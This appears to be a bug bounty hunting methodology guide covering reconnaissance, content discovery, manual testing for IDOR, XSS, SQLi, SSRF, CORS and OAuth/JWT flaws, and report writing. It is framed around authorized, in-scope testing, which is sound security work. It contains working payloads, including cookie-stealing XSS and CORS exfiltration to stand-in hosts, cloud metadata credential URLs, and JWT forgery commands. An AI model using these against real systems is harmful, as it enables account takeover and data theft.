Phase 01
Scope & Target Selection
Before you touch a single tool
▶
Pre-engagement checklist
Target prioritization framework
Tier 1 (attack first): Authentication endpoints, payment flows, user data APIs, admin panels, file upload, OAuth callbacks
Tier 2: User-generated content, search/filter, profile settings, notification systems, export features
Tier 3: Static content, marketing pages, documentation, support pages
OSINT before you touch the target
# Shodan — find exposed services before even touching the domain
shodan search "org:TargetCorp" --fields ip_str,port,hostnames

# Censys — alternative with cert data
censys search "parsed.names: target.com" --fields ip,protocols

# Google dorks — run before any active testing
site:target.com filetype:pdf OR filetype:xlsx OR filetype:docx
site:target.com inurl:admin OR inurl:api OR inurl:internal
"target.com" inurl:github.com
"target.com" "api_key" OR "apikey" OR "secret" site:github.com
🏆 Golden Rule
Spend 30 minutes reading the scope before touching any tool. Triagers see people report OOS bugs constantly — don't be that person. Every OOS report harms your reputation.
Phase 02
Subdomain Enumeration
Expand your attack surface — more subdomains = more bugs
▶
Tools
subfinderassetfinderamass dnsxhttpxanew purednsshufflednscrtsh
Full passive enumeration pipeline
# Step 1 — Passive (no touching the target)
subfinder -d target.com -silent -all | anew subs.txt
assetfinder --subs-only target.com | anew subs.txt
amass enum -passive -d target.com | anew subs.txt

# crt.sh — certificate transparency (often finds subs passive tools miss)
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | anew subs.txt

# Step 2 — Resolve (only live hosts)
cat subs.txt | dnsx -silent -threads 50 | anew resolved.txt

# Step 3 — Probe live HTTP services
cat resolved.txt | httpx -silent -title -status-code -tech-detect -ports 80,443,8080,8443,8888,3000,5000 | anew live.txt

# Manual check: look for NXDOMAIN pointing to 3rd-party service
cat resolved.txt | httpx -cname -silent | grep -E "github|heroku|netlify|s3|azure|shopify"
What to prioritize in live.txt output
dev. staging. test. beta. uat. — always less hardened, same codebase as prod
admin. internal. intranet. corp. — accidentally exposed internal tooling
api. api-v2. gw. gateway. — direct API access, often skips web WAF
Status 401 / 403 — not dead. Try different HTTP methods, headers (X-Forwarded-For, X-Original-URL)
Subdomains on non-standard ports that respond — dev tooling, debug servers, CI/CD
🎯 If you find a dangling CNAME / NXDOMAIN
Check what service the CNAME points to (Heroku, GitHub Pages, S3, Netlify, Fastly, Azure, Shopify)
Attempt to claim the resource on that platform. If you can serve content — subdomain takeover confirmed
Only serve an HTML page with your handle + a note. Screenshot everything. Report immediately
Severity: High if the domain is used for cookies/auth. Medium for generic pages
Phase 03
Endpoint & Content Discovery
Find what's actually running behind the domains
▶
Tools

Step 1 — Historical URL mining (ALWAYS do this before active fuzzing)
# gau: pulls URLs from AlienVault OTX, Wayback, URLScan
echo "target.com" | gau --subs --threads 10 | anew urls.txt

# waybackurls: direct Wayback Machine query
waybackurls target.com | anew urls.txt

# gf: pattern match for vuln classes
cat urls.txt | gf xss | anew xss-candidates.txt
cat urls.txt | gf sqli | anew sqli-candidates.txt
cat urls.txt | gf redirect | anew redirect-candidates.txt
cat urls.txt | gf ssrf | anew ssrf-candidates.txt
cat urls.txt | gf idor | anew idor-candidates.txt

# URO: deduplicate/normalize URLs (cuts noise dramatically)
cat urls.txt | uro | anew urls-clean.txt
Step 2 — Active crawl
# katana: modern crawler, JS-aware, renders SPA apps
katana -u https://target.com -jc -d 3 -silent -ef png,svg,gif,jpg,jpeg,css,woff,woff2 | anew urls.txt

# -jc: JavaScript crawl (follows JS-generated links)
# -d 3: crawl depth 3 (increase for large apps, but slow)
# -ef: exclude file extensions (reduces noise)
Step 3 — Directory & file fuzzing
# ffuf: fast web fuzzer — content discovery mode
ffuf -u https://target.com/FUZZ \
     -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt \
     -mc 200,201,204,301,302,307,401,403 \
     -fc 404 \
     -t 40 \
     -ac \
     -o ffuf-dirs.json -of json

# -mc: match these status codes
# -fc: filter (ignore) 404s
# -t 40: 40 threads — bump if target allows it
# -ac: auto-calibrate to filter false positives (smart)

# File extension fuzzing
ffuf -u https://target.com/FUZZ \
     -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt \
     -e .php,.asp,.aspx,.json,.xml,.bak,.old,.sql,.zip,.tar.gz,.env,.config \
     -mc 200,201,301,302,401,403 -ac
Step 4 — Parameter discovery
# arjun: find hidden GET/POST parameters
arjun -u https://target.com/endpoint -m GET
arjun -u https://target.com/endpoint -m POST

# paramspider: mine params from Wayback for a domain
python3 paramspider.py -d target.com -s

# x8: hidden parameter bruteforce
x8 -u "https://target.com/page?FUZZ=test" -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt
Gold targets in the output
/api/v1/ /api/v2/ /graphql /rest/ /v3/ — APIs are your primary source of IDOR and auth bugs
.git/ .env config.json backup.zip db.sql — instant critical if accessible
/admin /dashboard /manage /console /phpinfo.php — exposed management panels
Old versioned endpoints — /api/v1/ often lacks auth controls the new /api/v3/ has
JS map files (.js.map) — leak original source code, exposing undocumented endpoints
🚨 If you find exposed .git or .env
.git/ → run git-dumper https://target.com/.git/ ./dump, then git log --all + trufflehog on the dump
.env → look for DB credentials, JWT secrets, AWS keys, Stripe keys. This is Critical
Never use found credentials to access prod data. Screenshot the value, blur the secret in report, explain what it grants

Phase 06
Manual Vulnerability Testing
Where real bugs are found — no scanner replaces this
▶
Tools
Burp Suiteinteractsharjun sqlmapffufqsreplace XSS Huntercaido
IDOR — every object reference is a candidate
1
Create two accounts (A and B) on the target. Log in as A, perform actions, intercept every request in Burp
2
In Burp Repeater, swap account A's session token/cookie for account B's. Replay the request
3
Look for IDs in: URL path (/user/1234), query params (?id=1234), JSON body ("userId": 1234), request headers
4
Try incrementing numeric IDs. For UUIDs — see if you can enumerate them from other endpoints (search, listings, exports)
5
Test all CRUD operations: if GET works, try PUT/PATCH/DELETE with the other user's ID
# Automate IDOR ID fuzzing with ffuf
ffuf -u "https://target.com/api/user/FUZZ" \
     -w  \
     -H "Authorization: Bearer <victim_token>" \
     -mc 200 \
     -fr "Forbidden|Unauthorized"
XSS — follow every input that touches the DOM
Reflected: Start with <script>alert(1)</script>. Watch the raw response in Burp — does it land unencoded in HTML, in a JS string, in an attribute?
Context-specific payloads: HTML tag → <img src=x onerror=alert(1)> / JS string → "-alert(1)-" / Attribute → " onmouseover="alert(1)
Stored XSS: Does your payload appear anywhere else? Admin dashboards, notification feeds, exported data, email previews
Blind XSS: Use interactsh or XSS Hunter as the payload value. Check for callbacks. Set and forget, re-check after 24h
CSP bypass check: Look for Content-Security-Policy header. Weak CSPs often allow unsafe-inline or wildcard origins
# Dalfox: targeted XSS scanner with good WAF bypass
dalfox url "https://target.com/search?q=FUZZ" --silence

# Manual blind XSS payload — interactsh
<script src="https://YOUR.oast.me"></script>
<img src=x onerror="fetch('https://YOUR.oast.me/'+document.cookie)">
SQLi — probe every database interaction
Error-based detection: Inject ' in every parameter. Watch for 500 errors, SQL error messages, or behavioral differences
Boolean-based: ' AND 1=1-- vs ' AND 1=2-- — if responses differ, blind SQLi confirmed
Time-based: ' AND SLEEP(5)-- (MySQL) / '; WAITFOR DELAY '0:0:5'-- (MSSQL) — response delay confirms blind injection
Use sqlmap ONLY after manually confirming an injection point. Don't blast it blindly against every URL
# sqlmap — confirmed injection point, careful enumeration only
sqlmap -u "https://target.com/page?id=1" \
       --batch \
       --level 2 \
       --risk 1 \
       --dbs
# --batch: non-interactive (auto yes/no)
# --level 2: test headers too (cookies, referer)
# --risk 1: low-risk payloads only (won't break things)
# --dbs: enumerate databases, stop here for PoC
SSRF — attack server-side requests
Target params: ?url= ?webhook= ?callback= ?fetch= ?dest= ?image_url= ?pdf= ?load=
Confirm with OOB: Point the param at your interactsh URL. If it calls back — SSRF confirmed
Cloud metadata: http://169.254.169.254/latest/meta-data/ (AWS) → if it returns data, that's Critical
Blind SSRF escalation: Try http://localhost/ http://127.0.0.1:6379 (Redis) http://169.254.169.254/ http://10.0.0.1/
# Test with interactsh
interactsh-client &   # start listener, grab your URL
# Then inject: ?url=https://YOUR.oast.me

http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
# GCP metadata
http://metadata.google.internal/computeMetadata/v1/?recursive=true
Business Logic & Race Conditions
Race condition on coupon/promo codes, gift cards, reward points — apply the same one multiple times in parallel
Price manipulation: Change price/quantity in POST body during checkout. Try negative numbers, zero, or floats
Step skipping: In multi-step flows (checkout, verify, confirm) — can you jump directly to the final step?
Mass assignment: Add extra fields to PUT/PATCH requests ("role":"admin", "isVerified":true). Some frameworks accept unexpected fields
# Burp Suite — race condition with Turbo Intruder
# Send to Turbo Intruder, use race.py template
# Sends N requests in parallel (single TCP connection, H2 preferred)

# Manual parallel race with curl:
for i in {1..20}; do curl -s -X POST https://target.com/apply-coupon -d "code=SAVE50" -H "Cookie: ..." & done; wait
CORS Misconfiguration
Add Origin: https://evil.com header to API requests. If the response mirrors it in Access-Control-Allow-Origin with Access-Control-Allow-Credentials: true — exploitable
Try Origin: null — some configs allow null origin, exploitable via sandboxed iframes
Try prefixing/suffixing: Origin: https://target.com.evil.com — misconfigured regex checks
# Quick CORS check
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me \
  | grep -i "access-control"

# PoC JS payload (drop in target origin to test)
fetch('https://target.com/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://attacker.com/?leak='+btoa(d)))
Open Redirect & Host Header Injection
Target params: ?redirect= ?next= ?return_to= ?continue= ?goto= ?returnUrl=
Bypass attempts: https://evil.com → //evil.com → ////evil.com → https://[email protected] → https://evil.com?target.com
Host header: inject Host: attacker.com — if reflected in password reset links, that's a critical vuln
🏆 When you confirm a vuln — stop here
Stop exploitation at proof. A screenshot of alert(document.domain) or a single IDOR'd record is enough for a valid report
Save the full Burp request/response. Note exact reproduction steps while they're fresh
Check scope one final time. Confirm the endpoint is in-scope. Then write the report immediately
Phase 07
Authentication, OAuth & JWT Testing
Account takeover is the highest-impact class
▶
Password reset flow — most common ATO vector
OAuth 2.0 — common misconfigs
State parameter missing/unvalidated: If state is absent or not checked → CSRF on OAuth flow → account linking attack
Open redirect_uri: If the server accepts redirect_uri=https://attacker.com → steal auth code → full ATO
Code re-use: Can you replay an OAuth code after it's been used? Should only work once
Response type confusion: Try changing response_type=code to response_type=token — implicit flow may leak tokens in URL
# redirect_uri bypass attempts
https://target.com/oauth?redirect_uri=https://attacker.com
https://target.com/oauth?redirect_uri=https://attacker.com%2F..%2F
https://target.com/oauth?redirect_uri=https://target.com.attacker.com
https://target.com/oauth?redirect_uri=https://target.com/callback#@attacker.com
JWT — common vulnerabilities
Algorithm confusion (alg:none): Change alg to none in header, remove signature, forge claims
RS256 → HS256: If server uses RS256, switch alg to HS256 and sign with the public key as the HMAC secret
Weak secret: Try cracking the HMAC secret with hashcat or jwt-cracker
Claim tampering: Change role: user → role: admin, sub to another user's ID
# jwt_tool — the go-to for JWT testing
python3 jwt_tool.py <token> -T   # tamper mode — all attacks
python3 jwt_tool.py <token> -X a  # alg:none attack
python3 jwt_tool.py <token> -X k  # key confusion RS256→HS256
python3 jwt_tool.py <token> -C -d wordlist.txt  # crack weak secret
2FA bypass techniques
💡 Attack chain that regularly wins bounties
Open Redirect + OAuth state missing → steal auth code → account takeover
Host header injection + password reset → steal reset link → account takeover
JWT alg:none → forge admin token → privilege escalation
Phase 08
Report Writing
Get paid — a bad report kills a good bug
▶
Report structure — always in this order
1
Title — vuln type + exact location. E.g.: "Stored XSS in profile bio field at /settings/profile" or "IDOR allows reading any user's private messages via /api/v2/messages/{id}"
2
Severity & CVSS — include a CVSS 3.1 vector string + score. Don't oversell: an accurate severity builds reputation. Self-XSS is not Critical
3
Summary — 2–3 sentences max. What is the bug, where is it, what can an attacker do with it. Should be readable without technical background
4
Steps to Reproduce — numbered, exact, reproducible by a triager who has never seen it. Include URLs, request bodies, headers. Test your own steps before submitting
5
Impact — concrete, not abstract. "Attacker can read any user's private messages" >> "this could lead to sensitive data exposure". Explain the blast radius
6
Proof of Concept — Burp request/response screenshot, video, or working exploit. alert(document.domain) for XSS, single IDOR'd record for IDOR
7
Remediation — one or two sentences. Proves you understand the root cause. E.g.: "Implement server-side authorization checks on every object access, verifying the requesting user owns the resource"

Mistakes that get reports closed
Vague impact — "could lead to sensitive data exposure" with zero specifics. Always answer: whose data, what data, what can an attacker do with it
Missing repro steps — if triage can't reproduce it in 5 minutes, it goes to the bottom of the pile. Test your own steps
Overselling severity — a reflected XSS requiring admin login is not Critical. Accurate scoring builds reputation with triagers
OOS assets — instant close, marks your account. Always double-check scope before hitting submit
Duplicate without checking — read recent reports if public. Look for similar endpoints already closed
No PoC — if you can't prove it's exploitable, triagers can't escalate it. Always include working evidence
